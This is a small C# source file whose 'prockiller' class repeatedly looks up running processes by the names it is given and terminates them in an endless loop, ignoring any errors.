using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

public class prockiller
{
    static System.Object lockThis = new System.Object();

    public prockiller(String st)
    {

    }
    public static void Kills(String[] str)
    {
        lock (lockThis)
        {
            while (true)
            {
                foreach (String st in str)
                {
                    string target_name = st;
                    System.Diagnostics.Process[] local_procs = System.Diagnostics.Process.GetProcesses();
                    try
                    {
                        System.Diagnostics.Process target_proc = local_procs.First(p => p.ProcessName == target_name);
                        target_proc.Kill();
                    }
                    catch (Exception)
                    {


                    }
                    Thread.Sleep(100);
                }
            }
        }
    }

}
